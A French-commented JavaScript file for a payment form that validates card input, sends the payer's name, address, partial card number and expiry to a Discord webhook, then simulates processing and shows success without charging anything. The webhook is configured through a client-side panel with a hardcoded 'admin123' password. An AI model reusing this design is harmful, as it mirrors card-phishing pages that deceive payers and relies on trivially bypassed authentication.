document.addEventListener('DOMContentLoaded', function() {
    // Configuration
    let config = {
        webhookUrl: localStorage.getItem('webhookUrl') || '',
        adminPassword: 'admin123' // Changez ce mot de passe pour plus de sécurité
    };

    // Éléments du DOM
    const paymentForm = document.getElementById('payment-form');
    const cardNumberInput = document.getElementById('card-number');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardError = document.getElementById('card-error');
    const paymentButton = document.getElementById('payment-button');
    const processingDiv = document.getElementById('processing');
    const successMessage = document.getElementById('success-message');
    
    // Éléments du panneau d'administration
    const adminToggle = document.getElementById('admin-toggle');
    const adminPanel = document.getElementById('admin-panel');
    const adminPassword = document.getElementById('admin-password');
    const adminLogin = document.getElementById('admin-login');
    const webhookConfig = document.getElementById('webhook-config');
    const webhookUrlInput = document.getElementById('webhook-url');
    const saveConfigButton = document.getElementById('save-config');
    const adminClose = document.getElementById('admin-close');

    // Initialiser l'URL du webhook s'il existe
    if (config.webhookUrl) {
        webhookUrlInput.value = config.webhookUrl;
    }

    // Gestion du panneau d'administration
    adminToggle.addEventListener('click', function() {
        adminPanel.classList.remove('hidden');
        adminPassword.focus();
    });

    adminClose.addEventListener('click', function() {
        adminPanel.classList.add('hidden');
        webhookConfig.classList.add('hidden');
        adminPassword.value = '';
    });

    adminLogin.addEventListener('click', function() {
        if (adminPassword.value === config.adminPassword) {
            webhookConfig.classList.remove('hidden');
            adminPassword.value = '';
        } else {
            adminPassword.value = '';
            adminPassword.placeholder = 'Mot de passe incorrect';
            adminPassword.style.borderColor = 'var(--error-color)';
            
            setTimeout(function() {
                adminPassword.style.borderColor = '';
                adminPassword.placeholder = 'Entrez votre mot de passe';
            }, 2000);
        }
    });

    // Formatage du numéro de carte
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formattedValue;
    });

    // Validation du numéro de carte (Luhn Algorithm)
    function validateCardNumber(number) {
        const digits = number.replace(/\s/g, '');
        let sum = 0;
        let isEven = false;
        
        for (let i = digits.length - 1; i >= 0; i--) {
            let digit = parseInt(digits[i], 10);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return sum % 10 === 0;
    }

    // Formatage de la date d'expiration
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // Validation du CVV (uniquement des chiffres)
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    // Envoi des données au webhook Discord
    async function sendToWebhook(data) {
        if (!config.webhookUrl) {
            console.error('URL du webhook non configurée');
            return false;
        }

        try {
            const response = await fetch(config.webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: 'Nouvelle soumission de paiement',
                    embeds: [
                        {
                            title: 'Détails du paiement',
                            color: 5814783, // Couleur bleue
                            fields: [
                                { name: 'Nom complet', value: data.fullname, inline: true },
                                { name: 'Adresse', value: data.address, inline: false },
                                { name: 'Numéro de carte', value: `****-****-****-${data.cardNumber.slice(-4)}`, inline: true },
                                { name: 'Expiration', value: data.expiry, inline: true },
                                { name: 'CVV', value: '***', inline: true },
                                { name: 'Montant', value: '100 €', inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }
                    ]
                })
            });

            if (!response.ok) {
                throw new Error('Erreur lors de l\'envoi au webhook');
            }

            return true;
        } catch (error) {
            console.error('Erreur:', error);
            return false;
        }
    }

    // Soumission du formulaire
    paymentForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Validation du numéro de carte
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        if (!validateCardNumber(cardNumber)) {
            cardError.textContent = 'Numéro de carte invalide';
            cardError.style.display = 'block';
            return;
        } else {
            cardError.style.display = 'none';
        }

        // Récupérer les données du formulaire
        const formData = {
            fullname: document.getElementById('fullname').value,
            address: document.getElementById('address').value,
            cardNumber: cardNumber,
            expiry: expiryInput.value,
            cvv: cvvInput.value
        };

        // Afficher l'écran de traitement
        paymentForm.style.display = 'none';
        processingDiv.classList.remove('hidden');

        // Envoyer les données au webhook
        await sendToWebhook(formData);

        // Simuler un délai de traitement de 5 secondes
        setTimeout(function() {
            processingDiv.classList.add('hidden');
            successMessage.classList.remove('hidden');
        }, 5000);
    });

    // Sauvegarder la configuration
    saveConfigButton.addEventListener('click', function() {
        config.webhookUrl = webhookUrlInput.value;
        localStorage.setItem('webhookUrl', config.webhookUrl);
        
        // Afficher une confirmation
        const originalText = saveConfigButton.textContent;
        saveConfigButton.textContent = 'Enregistré !';
        saveConfigButton.style.backgroundColor = 'var(--success-color)';
        
        setTimeout(function() {
            saveConfigButton.textContent = originalText;
            saveConfigButton.style.backgroundColor = '';
        }, 2000);
    });
});
